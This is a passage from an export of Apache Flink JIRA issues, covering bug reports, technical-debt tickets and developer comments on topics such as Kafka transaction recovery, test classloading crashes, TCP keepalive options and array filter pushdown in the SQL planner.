“kafka-producer-network-thread | producer-tx-account-7a604e01-CONNECTION-75373861-0-1708579""
“kafka-producer-network-thread | producer-tx-account-7a604e01-CONNECTION-75373861-0-1708580”
“kafka-producer-network-thread | producer-tx-account-7a604e01-CONNECTION-75373861-0-1708581""
“kafka-producer-network-thread | producer-tx-account-7a604e01-CONNECTION-75373861-0-1708582”
{code}
The only way I see this happen is if the loop is creating new producer instances per attempted TID, but it doesn't make sense given the code. It could be something wrong with how the KafkaSink is using Java reflections to reset the TID on the reused producer, but I'll need to spend some time to look into this a bit deeper.;;;","26/May/23 04:50;sharonxr55;[~tzulitai]Thanks for analyzing the logs. As additional context, this happened after a security patch on the broker side. Though most of the jobs auto recovered, we've found a couple that got stuck in the recovery step. So there is a chance that this is caused by an issue from the broker side - eg: some broker side transaction state is lost or bad partition state. Any possible explanation here?

A couple other questions.

> These are the ones to abort in step 2. Initializing the transaction automatically aborts the transaction, as I mentioned in earlier comments. So I believe this is also expected.

In this case, does the transaction state [messages|https://gist.github.com/sharonx/51e300e383455f016be1a95f0c855b97] in kafka broker look right to you? It seems there is no change in those messages except the epoch and txnLastUpdateTimestamp. I guess the idea is to call transaction init with the old txnId and just let it time out. But there is some heart beat to update the transaction? Also can you please explain a bit about why abortTransaction is not used?

> What is NOT expected, though, is the bunch of kafka-producer-network-thread threads being spawned per TID to abort in step 2.
Is it common to have so many lingering transactions that need to abort? The job is not a high throughput one. About 3 records/sec at the checkpointing interval = 10sec. It takes ~30min to run oom and I feel it's weird that the kafka sink would need so long to recover.;;;",,,,,,,,,,,,,,,,,,
Add SQL Gateway custom headers support,FLINK-32195,13537699,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,elkhand,elkhand,25/May/23 18:14,01/Aug/23 18:55,04/Jun/24 20:41,01/Aug/23 18:55,1.17.0,,,,,,,,,,,,,,,,,,,,Table SQL / Gateway,,,,0,features,,,"For some use cases, it might be needed setting a few extra HTTP headers with a request to FlinkSQL Gateway, for example, a cookie for Auth/session.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-25 18:14:34.0,,,,,,,,,,"0|z1i5dk:",9223372036854775807,Duplicate of FLINK-32373,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Elasticsearch connector should remove the dependency on flink-shaded,FLINK-32194,13537683,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,tanyuxin,tanyuxin,tanyuxin,25/May/23 15:01,30/May/23 01:48,04/Jun/24 20:41,29/May/23 11:49,elasticsearch-3.1.0,,,,,,,,,,,,,,elasticsearch-3.1.0,,,,,,Connectors / ElasticSearch,,,,0,pull-request-available,,,"The Elasticsearch connector depends on flink-shaded. With the externalization of the connector, the connectors shouldn't rely on Flink-Shaded",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon May 29 11:49:20 UTC 2023,,,,,,,,,,"0|z1i5a0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/May/23 11:49;Weijie Guo;main via 71a8567bbd83a111df4f85d4465e4cda0ccae916.;;;",,,,,,,,,,,,,,,,,,,,,,
AWS connector removes the dependency on flink-shaded,FLINK-32193,13537675,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,tanyuxin,tanyuxin,25/May/23 13:40,12/Oct/23 08:09,04/Jun/24 20:41,12/Oct/23 08:09,aws-connector-4.2.0,,,,,,,,,,,,,,,,,,,,Connectors / AWS,,,,0,,,,"The AWS connector depends on flink-shaded. With the externalization of the connector, connectors shouldn't rely on Flink-Shaded",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Oct 12 08:09:35 UTC 2023,,,,,,,,,,"0|z1i588:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Oct/23 08:09;tanyuxin;Duplicated with https://issues.apache.org/jira/browse/FLINK-33194;;;",,,,,,,,,,,,,,,,,,,,,,
JsonBatchFileSystemITCase fail due to Process Exit Code: 239 (NoClassDefFoundError: akka.actor.dungeon.FaultHandling$$anonfun$handleNonFatalOrInterruptedException$1),FLINK-32192,13537658,13537639,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Duplicate,,Sergey Nuyanzin,Sergey Nuyanzin,25/May/23 12:15,13/Jun/23 21:32,04/Jun/24 20:41,13/Jun/23 21:32,1.18.0,,,,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",Tests,,,0,test-stability,,,"[This build|https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49288&view=logs&j=7e3d33c3-a462-5ea8-98b8-27e1aafe4ceb&t=ef77f8d1-44c8-5ee2-f175-1c88f61de8c0] failed with a 239 exit code in test_cron_hadoop313 connect_1 with JsonBatchFileSystemITCase crashed
{noformat}
May 24 01:02:14 01:02:14.069 [ERROR] Crashed tests:
May 24 01:02:14 01:02:14.069 [ERROR] org.apache.flink.formats.json.JsonBatchFileSystemITCase
May 24 01:02:14 01:02:14.069 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.fork(ForkStarter.java:748)
May 24 01:02:14 01:02:14.069 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.access$700(ForkStarter.java:121)
May 24 01:02:14 01:02:14.069 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter$2.call(ForkStarter.java:465)
May 24 01:02:14 01:02:14.069 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter$2.call(ForkStarter.java:442)
May 24 01:02:14 01:02:14.069 [ERROR] 	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
May 24 01:02:14 01:02:14.069 [ERROR] 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
May 24 01:02:14 01:02:14.069 [ERROR] 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
May 24 01:02:14 01:02:14.069 [ERROR] 	at java.lang.Thread.run(Thread.java:748)
{noformat}

also in logs 
{noformat}
01:02:00,081 [flink-akka.actor.default-dispatcher-9] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.actor.default-dispatcher-9' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: akka/actor/dungeon/FaultHandling$$anonfun$handleNonFatalOrInterruptedException$1
        at akka.actor.dungeon.FaultHandling.handleNonFatalOrInterruptedException(FaultHandling.scala:336) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.actor.dungeon.FaultHandling.handleNonFatalOrInterruptedException$(FaultHandling.scala:336) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.actor.ActorCell.handleNonFatalOrInterruptedException(ActorCell.scala:410) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.actor.ActorCell.systemInvoke(ActorCell.scala:535) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:295) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.dispatch.Mailbox.run(Mailbox.scala:230) ~[flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at akka.dispatch.Mailbox.exec(Mailbox.scala:243) [flink-rpc-akka_af85cba1-bb7d-40d1-98e1-939c276575fd.jar:1.18-SNAPSHOT]
        at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) [?:1.8.0_292]
        at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) [?:1.8.0_292]
Caused by: java.lang.ClassNotFoundException: akka.actor.dungeon.FaultHandling$$anonfun$handleNonFatalOrInterruptedException$1
        at java.net.URLClassLoader.findClass(URLClassLoader.java:382) ~[?:1.8.0_292]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:418) ~[?:1.8.0_292]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClassFromComponentOnly(ComponentClassLoader.java:150) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at org.apache.flink.core.classloading.ComponentClassLoader.loadClass(ComponentClassLoader.java:113) ~[flink-core-1.18-SNAPSHOT.jar:1.18-SNAPSHOT]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ~[?:1.8.0_292]
        ... 12 more

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-25 12:15:24.0,,,,,,,,,,"0|z1i54g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support for configuring tcp keepalive related parameters.,FLINK-32191,13537653,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,huwh,lsdy,lsdy,25/May/23 11:54,28/Jun/23 11:55,04/Jun/24 20:41,28/Jun/23 11:55,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Network,,,,0,pull-request-available,,,"We encountered a case in our production environment where the netty client was unable to send data to the server due to an abnormality in the switch link. However, client can only detect the abnormality after RTO timeout retransmission failure, which takes about 15 minutes in our production environment. This may result in a 15-minute job unavailability. We hope to perform failover and reschedule job more quickly. Flink has already enabled keepalive, but the default keepalive idle time is 2 hours. We can adjust the timeout of TCP keepalive by configuring TCP_KEEPIDLE, TCP_KEEPINTERVAL, and TCP_KEEPCOUNT. These configurations are already supported at the Netty.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 11:55:24 UTC 2023,,,,,,,,,,"0|z1i53c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 06:14;huwh;There are two transport types, Nio and Epoll. 

For Epoll, we already have options for keepalive, such as ""EpollChannelOption.TCP_KEEPIDLE"".
But for Nio, the keepalive options have been introduced by JDK11, such as ""ExtendedSocketOptions.TCP_KEEPIDLE"".

Flink is still required to be compatible with JDK8, even though it has been deprecated. Hence, we need to inform users that these configurations will not be taken into account if NIO and JDK8 are used together. 

Would you mind taking a look at this ticket when you are free. [~Weijie Guo][~wanglijie]
;;;","28/Jun/23 11:55;guoyangze;master: 873a56361bfd77c828ee743febc9dda2bb044791;;;",,,,,,,,,,,,,,,,,,,,,
Bad link in Flink page,FLINK-32190,13537651,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,JunRuiLi,claude,claude,25/May/23 11:50,01/Jun/23 06:09,04/Jun/24 20:41,01/Jun/23 06:09,,,,,,,,,,,,,,,,,,,,,Documentation,,,,0,pull-request-available,,,"on the page: [https://flink.apache.org/use-cases/]
in the section: What are typical data analytics applications?

The first link: [Quality monitoring of Telco networks|http://2016.flink-forward.org/kb_sessions/a-brief-history-of-time-with-apache-flink-real-time-monitoring-and-analysis-with-flink-kafka-hb/]

returns a 404 error: 
h1. This site can’t be reached

Check if there is a typo in 2016.flink-forward.org.
DNS_PROBE_FINISHED_NXDOMAIN",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 01 06:09:05 UTC 2023,,,,,,,,,,"0|z1i52w:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/May/23 03:08;JunRuiLi;It seems that the 404 error was caused by an expired external link. May be we can replace other links or remove this use case. [~wanglijie] What do you think? I'd like to take this ticket.:);;;","26/May/23 03:10;wanglijie;Thanks [~JunRuiLi], assigned to you :);;;","31/May/23 03:27;JunRuiLi;The user cases page has some bad links, all because the linked site has expired. I plan to replace these bad links with the video page posted on youtube by the flink-forward official account.;;;","01/Jun/23 06:09;wanglijie;Fix via
asf-site(flink-web): f9e8540d629b220f0432033507b9b8ecfff5613f;;;",,,,,,,,,,,,,,,,,,,
Integration tests fail due to Process Exit Code: 239 and NoClassDefFound in logs ,FLINK-32189,13537639,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,,Sergey Nuyanzin,Sergey Nuyanzin,25/May/23 10:55,13/Jun/23 21:36,04/Jun/24 20:41,13/Jun/23 21:32,,,,,,,,,,,,,,,,,,,,,,,,,0,test-stability,,,Since there are multiple similar cases with different classes mentioned in {{NoClassDefFound}} this is an umbrella for such cases,,,,,,,,,,,,,,,FLINK-32314,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 21:36:29 UTC 2023,,,,,,,,,,"0|z1i508:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/May/23 08:09;renqs;[~chesnay] Could you take a look at this umbrella issue? Thanks;;;","13/Jun/23 21:36;chesnay;With FLINK-32314 we now ignore classloading errors in the rpc system after it has been shut down. I believe that the actor system termination future isn't telling us the whole story and threads can linger around still doing _something_. we don't have a handle on these threads so there's little we can do in terms of waiting for longer.
It is a bit of a band-aid, but I'm not sure where else to go; digging into Akka won't get us anywhere because this won't get fixed in the Apache licensed version.

Since this issue only occurs if the rpc system was closed, which only happens after our own business logic has already concluded (by virtue of all rpc endpoints being shut down) I don't see a risk in this approach.;;;",,,,,,,,,,,,,,,,,,,,,
"Support to ""where"" query with a fixed-value array and simplify condition for an array-type filed.",FLINK-32188,13537626,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,xinchen147,xinchen147,25/May/23 08:57,18/Aug/23 22:35,04/Jun/24 20:41,,1.12.2,1.16.1,1.17.0,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,auto-deprioritized-major,pull-request-available,,"When I customized a data source connector which assumed as image-connector, I met issues while creating a table with ddl to specify a field ""URL"" as an array type. When submitting an SQL task with Flink, I specified query of this field with a fixed array. For example, ""select * from image source where URL=ARRAY ['/flink. jpg', '/flink_1. jpg']"", but it couldn't obtain the corresponding predicate filters at all.

Does the custom connector not support  to query fields of array type with ""where""？",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/May/23 09:16;xinchen147;image-2023-05-25-17-16-02-288.png;https://issues.apache.org/jira/secure/attachment/13058527/image-2023-05-25-17-16-02-288.png","25/May/23 12:44;xinchen147;image-2023-05-25-20-44-08-834.png;https://issues.apache.org/jira/secure/attachment/13058551/image-2023-05-25-20-44-08-834.png","25/May/23 12:44;xinchen147;image-2023-05-25-20-44-47-581.png;https://issues.apache.org/jira/secure/attachment/13058550/image-2023-05-25-20-44-47-581.png","06/Jun/23 08:50;xinchen147;image-2023-06-06-16-50-10-805.png;https://issues.apache.org/jira/secure/attachment/13058817/image-2023-06-06-16-50-10-805.png","06/Jun/23 08:50;xinchen147;image-2023-06-06-16-50-54-467.png;https://issues.apache.org/jira/secure/attachment/13058816/image-2023-06-06-16-50-54-467.png","25/May/23 09:04;xinchen147;screenshot-1.png;https://issues.apache.org/jira/secure/attachment/13058526/screenshot-1.png","30/May/23 06:17;xinchen147;screenshot-10.png;https://issues.apache.org/jira/secure/attachment/13058625/screenshot-10.png","30/May/23 06:18;xinchen147;screenshot-11.png;https://issues.apache.org/jira/secure/attachment/13058626/screenshot-11.png","30/May/23 06:31;xinchen147;screenshot-12.png;https://issues.apache.org/jira/secure/attachment/13058627/screenshot-12.png","25/May/23 09:24;xinchen147;screenshot-2.png;https://issues.apache.org/jira/secure/attachment/13058528/screenshot-2.png","25/May/23 12:39;xinchen147;screenshot-3.png;https://issues.apache.org/jira/secure/attachment/13058546/screenshot-3.png","25/May/23 12:39;xinchen147;screenshot-4.png;https://issues.apache.org/jira/secure/attachment/13058547/screenshot-4.png","25/May/23 12:40;xinchen147;screenshot-5.png;https://issues.apache.org/jira/secure/attachment/13058548/screenshot-5.png","25/May/23 12:41;xinchen147;screenshot-6.png;https://issues.apache.org/jira/secure/attachment/13058549/screenshot-6.png","25/May/23 13:36;xinchen147;screenshot-7.png;https://issues.apache.org/jira/secure/attachment/13058552/screenshot-7.png","26/May/23 12:16;xinchen147;screenshot-8.png;https://issues.apache.org/jira/secure/attachment/13058574/screenshot-8.png","30/May/23 06:17;xinchen147;screenshot-9.png;https://issues.apache.org/jira/secure/attachment/13058624/screenshot-9.png",,17.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:06 UTC 2023,,,,,,,,,,"0|z1i4xc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 09:00;xinchen147;DDL and query sql like as:
{code:java}
tableEnv.executeSql(""CREATE TABLE IF NOT EXISTS image_source (\n"" +
                ""        url ARRAY<STRING>,\n"" + //ARRAY<STRING>
                ""        image ARRAY<BYTES>,\n"" + //ARRAY<BYTES>    
                ""        proc AS proctime()\n"" +
                ""        ) WITH (\n"" +
                ""        'connector' = 'image-connector',\n"" +
                ""        'ip'='11.11.11.11',\n"" +
                ""        'port'='11111',\n"" +
                ""        )"");
String s3 = ""select * from image_source ""
                + ""where url = ARRAY['/flink.jpg', '/flink_1.jpg']"";
        TableResult result = tableEnv.executeSql(s3);//s3
        result.print();

{code}

;;;","25/May/23 09:04;xinchen147;I debugged the Flink source code and found that predicate parsing was performed in the *PushFilterIntoTableSourceScanRule *of org. apache. Flink. table. planner. plan. rules. logical,
 !screenshot-1.png! 

In RexNodeExtractor.extractConjunctiveConditions，when it finally calls the visitCall method and parses the specified array input after 'where', it parses the operator as ARRAY and the kind as arrayvalueconstructor. It can be seen that there is no corresponding operator in the match method, and ultimately matches and enters the lookupFunction

 !image-2023-05-25-17-16-02-288.png! ;;;","25/May/23 09:24;xinchen147;The lookupFunction here returned option. empty, resulting in the final predicate record being null！

I think this is incorrect and should not be matched to lookupFunction. Should we add 
{code:java}
“case SqlStdOperatorTable.ARRAY_VALUE_CONSTRUCTOR =>”
....?
{code}
 and change the input operands to array？ 

 !screenshot-2.png! 

;;;","25/May/23 09:26;martijnvisser;[~jark] [~lincoln.86xy] WDYT? ;;;","25/May/23 09:28;xinchen147;Or is there a better way to query the specified array with “where” as shown below?

{code:java}
where url = ARRAY['/flink.jpg', '/flink_1.jpg']
{code}

And it seems that this issue was not resolved and taken seriously on 1.17.
Thank you for your reply！;;;","25/May/23 12:42;xinchen147;I also explore why lookupFunction returned Option.empty：
Its internal call chain：
{code:java}
1、Try(functionCatalog.lookupFunction(identifier))----> 
2、resolveAmbiguousFunctionReference(identifier.getObjectName())----> 
3、Optional<FunctionDefinition> candidate = moduleManager.getFunctionDefinition(normalizedName)---->
4、modules.get(moduleName).listFunctions().stream().anyMatch(name::equalsIgnoreCase)
{code}
Empty is returned here because it cannot find ‘FunctionDefinition：ARRAY_VALUE_CONSTRUCTOR’  from loaded module: core.

 !screenshot-3.png! 
 !screenshot-4.png! 
 !image-2023-05-25-20-44-08-834.png! 
 !image-2023-05-25-20-44-47-581.png! ;;;","25/May/23 13:36;xinchen147;I try to modify the visitCall method by add codes to handle array_value_constructor :  
{code:java}
//add by xin chen
        case SqlStdOperatorTable.ARRAY_VALUE_CONSTRUCTOR =>
          Some(new CallExpression(BuiltInFunctionDefinitions.ARRAY, operands, outputType))
{code}
by this way, my customized connector can get the filter about the array. Then I can deal with that to get the results I want.  But I'm not sure if this is standard.


 !screenshot-7.png! 
;;;","26/May/23 11:38;jark;Yes, I think your fix is fine. The function name ""array"" in BuiltInFunctionDefinition is not equal to ""ARRAY_VALUE_CONSTRUCTOR"", I think that's why we can't find the function via {{lookupFunction}}.;;;","26/May/23 11:40;jark;But I'm also confused why the array constructor is not evaluated into literal before pushing down. ;;;","26/May/23 12:22;xinchen147;[~jark]  Thank you for your reply.

When I fix the issue through the method I introduced above，and url is defined as an array，I can obtain predicates successfully.
But I found another issue in my debugging process at the same time，when url is defined as string not an array，sql like this returned no results：
{code:java}
String s1_and = ""select * from image_source "" +
                ""where url = 'aaa.jpg'"" +
                ""and url = 'bbb.jpg'"";
{code}
This is because ‘url‘ cannot be assigned two different values simultaneously. I think this is logical. But when I defined it as an array type, sql like this returned two records unexpectedly! 

{code:java}
String s3_and = ""select * from image_source where "" +
                ""url = ARRAY['aaa.jpg', 'bbb.jpg'] and url = ARRAY['ccc.jpg', 'ddd.jpg']"";
{code}
 I debugged and found that the task has entered the *PushFilterIntoTableSourceScanRule *of org. apache. Flink. table. planner. plan. rules. logical, but when url is a string，the task of “url = xxx and url = yyy” didn't enter 'onMatch' method of *PushFilterIntoTableSourceScanRule*. 

 !screenshot-8.png! 
{code:java}
// filter：
rel#100:LogicalFilter.NONE.any.None: 0.[NONE].[NONE](input=HepRelVertex#99,condition=
AND(=($0, CAST(ARRAY(_UTF-16LE'aaa.jpg', _UTF-16LE'bbb.jpg')):VARCHAR(2147483647) CHARACTER SET ""UTF-16LE"" ARRAY NOT NULL), 
=($0, CAST(ARRAY(_UTF-16LE'ccc.jpg', _UTF-16LE'ddd.jpg')):VARCHAR(2147483647) CHARACTER SET ""UTF-16LE"" ARRAY NOT NULL)))
{code}

I am confused how the frame work to verify that a field cannot be equal to two values. In which module is this processed？Perhaps it should be in the code before ‘PushFilterIntoTableSourceScanRule’, but where is it？
I think this verification logic may need to be fixed for array types.;;;","30/May/23 06:28;xinchen147;I roughly understand how the framework simplifies SQL to verify that a field cannot be equal to two values and connects them using “AND”. 

 !screenshot-10.png! 
 !screenshot-11.png! 

Here, an instance of the Comparison class will be created or null will be returned, but only the “Literal” form is considered, without considering the existence of the following form for the ""operands"" of the ""RexNode e"" passed in：

{code:java}
CAST(ARRAY(_UTF-16LE'ccc.jpg', _UTF-16LE'ddd.jpg')):VARCHAR(2147483647) CHARACTER SET ""UTF-16LE"" ARRAY NOT NULL
{code}
So when the array is passed in, null is returned here, but the string correctly returns an instance of comparison. I think this is a significant difference. In the subsequent code logic, comparison will be used to verify that a field cannot be connected to two different values with “AND” in condition.;;;","30/May/23 06:31;xinchen147;The second question mentioned above is linked to https://issues.apache.org/jira/browse/CALCITE-5733.
The current solution I can think of is this, as shown in the PR submitted by github. I want to return a comparison of ""ARRAY""-RexCall-Type. Then, in the simplifyAndTerms method, parse the generated comparison with the shape of ""=($0, ARRAY['111', '222'])"" to generate the corresponding array. When it is found that the arrays with AND connections are different, immediately generate a false literal to achieve the desired simplified operation. That is to say, it can simplify “a = ARRAY[1,2] AND a = ARRAY[2,3]” to ""false"".  So it will return no results, that is correct.

 !image-2023-06-06-16-50-10-805.png! 
 !image-2023-06-06-16-50-54-467.png! ;;;","06/Jun/23 08:56;xinchen147;To make a summary, when submitting an SQL task with Flink to test a customized data source connector, I specified to query an array-type field of a temporary table with a fixed-value array. For example, ""select * from image-source where URL=ARRAY ['/flink. jpg', '/flink_1. jpg']"", but it couldn't obtain the corresponding predicate filters at all in the connector's DynamicTableSource.applyFilters method. The change related to ""RexNodeExtractor.scala""  can fix it.

By the way, linked to https://issues.apache.org/jira/browse/CALCITE-5733. Simplification seem to not take into account that the specified field is of array type. In other words，it can simplify ""a = 1 AND a = 2"" to ""false""，but can not simplify “a = [1,2] AND a = [2,3]” to ""false"". For example, ""select * from image-source where URL=ARRAY ['/flink. jpg', '/flink_1. jpg'] AND URL=ARRAY ['/f. jpg', '/f_1. jpg']"" can obtain two predicate conditions, this is illogical. Generally speaking, simplifying this SQL condition should not result in any predicates. Changes related to “RexSimplify.java” can fix it.

Maybe it is not standard. Thank you for your reply if anybody has better suggestions.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,
Remove dependency on flink-shaded,FLINK-32187,13537621,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Sergey Nuyanzin,Sergey Nuyanzin,Sergey Nuyanzin,25/May/23 08:42,25/May/23 10:09,04/Jun/24 20:41,25/May/23 10:09,,,,,,,,,,,,,,,mongodb-1.0.2,,,,,,Connectors / MongoDB,,,,0,,,,"The Mongo connector depends on flink-shaded. With the externalization of connector, connectors shouldn't rely on Flink-Shaded but instead shade dependencies such as this one themselves",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 10:08:19 UTC 2023,,,,,,,,,,"0|z1i4w8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 09:39;tanyuxin;[~Sergey Nuyanzin] If needed, I could help take a look at this issue. :D;;;","25/May/23 09:51;tanyuxin;[~Sergey Nuyanzin] I found you have submitted a PR, but it didn't link the issue dynamically. Please ignore the previous comment.;;;","25/May/23 10:07;Sergey Nuyanzin;yes... seems some issue happened
I linked a PR manually

thanks for volunteering ;;;","25/May/23 10:08;Sergey Nuyanzin; merged as [330845dd89526bd1ee5f7691ac2fcc7679a0ea9f|https://github.com/apache/flink-connector-mongodb/commit/330845dd89526bd1ee5f7691ac2fcc7679a0ea9f];;;",,,,,,,,,,,,,,,,,,,
Support subtask stack auto-search when redirecting from subtask backpressure tab,FLINK-32186,13537612,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Yu Chen,Yu Chen,Yu Chen,25/May/23 08:08,05/Jun/23 11:24,04/Jun/24 20:41,05/Jun/23 11:23,1.18.0,,,,,,,,,,,,,,1.17.2,1.18.0,,,,,Runtime / Web Frontend,,,,0,pull-request-available,,,"Note that we have introduced a dump link on the backpressure page in FLINK-29996(Figure 1), which helps to check what are the corresponding subtask doing more easily.

But we still have to search for the corresponding call stack of the back-pressured subtask from the whole TaskManager thread dumps, it's not convenient enough.

Therefore, I would like to trigger the search for the editor automatically after redirecting from the backpressure tab, which will help to scroll the thread dumps to the corresponding call stack of the back-pressured subtask (As shown in Figure 2).

!image-2023-05-25-15-52-54-383.png|width=680,height=260!
Figure 1. ThreadDump Link in Backpressure Tab

!image-2023-05-25-16-11-00-374.png|width=680,height=353!
